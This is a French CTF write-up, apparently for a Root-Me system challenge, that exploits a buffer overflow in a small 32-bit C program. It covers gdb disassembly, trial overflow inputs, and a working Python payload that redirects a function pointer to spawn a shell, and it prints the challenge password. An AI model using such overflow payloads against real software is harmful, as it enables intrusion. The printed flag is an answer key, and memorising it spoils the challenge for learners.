## BOF basic
Code source:
-----------------------------------------------------------------------------------------------------------------
    /*
    gcc -m32 -fno-stack-protector -o ch15 ch15.c
    */
     
    #include <stdio.h>
    #include <stdlib.h>
     
    void shell() {
        system("/bin/dash"); /* Du coup ici on à pas besoin de charger un shellcode en memoire, super simple */
    }
     
    void sup() {
        printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
    }
     
    main()
    { 
        int var;
        void (*func)()=sup;
        char buf[128];
        fgets(buf,133,stdin);
        func();
    }
 -----------------------------------------------------------------------------------------------------------------


On remarque que la fonction qui nous intéresse (system("\bin\dash")) est "isolée" de l’autre partie du code.
 Pour y accéder il suffit de récupérer son adresse grace à gdb :
1. gdb -q ./ch15
2. disass shell
3.  0x08048478 <+0>:       push   ebp
4. quit


Il suffit maintenant de remplacer la valeur de retour pour la remplacer avec celle obtenue
1. (echo $(python -c 'print "A" * 128 + "\x64\x84\x04\x08"');cat) | ./ch15 
cat nous permettant d’éviter l’EOF et d’executer un cat .passwd


→ notes perso:



GDB command:
----------------------------------------------------------------------------------------------------------------
run -> déroule tout le code
bp -> place un breakpoint
dissass -> desassemble une fonction (disass main)
continue -> continue jusqu'a la fin
next -> etape suivante (nexi: i etapes suivante)
-----------------------------------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------------------------------------
app-systeme-ch15@challenge02:~$ ./ch15
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hey dude ! Waaaaazzaaaaaaaa ?!
app-systeme-ch15@challenge02:~$ ./ch15
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
app-systeme-ch15@challenge02:~$ gdb ch15

# on desassemble le main:
=========================
gdb$ disass main
Dump of assembler code for function main:
   0x0804848c <+0>:     push   %ebp
   0x0804848d <+1>:     mov    %esp,%ebp
   0x0804848f <+3>:     and    $0xfffffff0,%esp
   0x08048492 <+6>:     sub    $0xa0,%esp
   0x08048498 <+12>:    movl   $0x8048478,0x9c(%esp)
   0x080484a3 <+23>:    mov    0x804a01c,%eax
   0x080484a8 <+28>:    mov    %eax,0x8(%esp)
   0x080484ac <+32>:    movl   $0x85,0x4(%esp)
   0x080484b4 <+40>:    lea    0x1c(%esp),%eax
   0x080484b8 <+44>:    mov    %eax,(%esp)
   0x080484bb <+47>:    call   0x8048360 <fgets@plt>
   0x080484c0 <+52>:    mov    0x9c(%esp),%eax
   0x080484c7 <+59>:    call   *%eax
   0x080484c9 <+61>:    leave
   0x080484ca <+62>:    ret

#on desassemble la fonction shell:
==================================

gdb$ disass shell
Dump of assembler code for function shell:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   0x08048467 <+3>:     sub    $0x18,%esp
   0x0804846a <+6>:     movl   $0x80485a0,(%esp)
   0x08048471 <+13>:    call   0x8048380 <system@plt>
   0x08048476 <+18>:    leave
   0x08048477 <+19>:    ret

Le fonction a appeller se situe donc a l'addresse: 0x08048464    08 04 84 64
IL FAUT DONC ECRIRE 64840408 car x86 = litlle indian

# la fonction sup ne nous sert a rien car effectue juste un printf

breakpoint avant la saisie: bp *0x080484bb 
juste appres le imput: bp *0x080484c0

Breackpoint de controle du BOF: bp *0x080484c7

input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
=> EIP: 42424242 (B)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
=> EIP: 42424242 (B)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
=> EIP: 41414141 (A)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
=> EIP: 41414141 (A)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
=> EIP: 41414141 (A)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB
EIP: 0x42424141

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCBBBBBBBBBBBBBBB
EIP: 0x43434343

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC

le bof est exploitable via un pipe python:
app-systeme-ch15@challenge02:~$ python -c "print 'A'*300" | ./ch15
Segmentation fault

on peut passer la chaine en bash (hors gdb) de la maniere suivante:
====================================================================
python -c "print'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + '\x64\x84\x04\x08'" | ./ch15

ou dans le input de gdb:
========================
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x64\x84\x04\x08

SOLUTION: 
=========
app-systeme-ch15@challenge02:~$ python -c "print'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + '\x64\x84\x04\x08'" > /tmp/input.txt
app-systeme-ch15@challenge02:~$ cat /tmp/input.txt - | ./ch15        ### l'important c'est le “-”                                                                    
ls
ch15  ch15.c
cat .passwd
B33r1sSoG0oD4y0urBr4iN


passwd:
B33r1sSoG0oD4y0urBr4iN


autre solution pour concerver le shell:
Il suffit maintenant de remplacer la valeur de retour pour la remplacer avec celle obtenue

    (echo $(python -c 'print "A" * 128 + "\x64\x84\x04\x08"');cat) | ./ch15 
    (python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"';cat) |./ch16

cat nous permettant déviter lEOF et dexecuter un cat .passwd








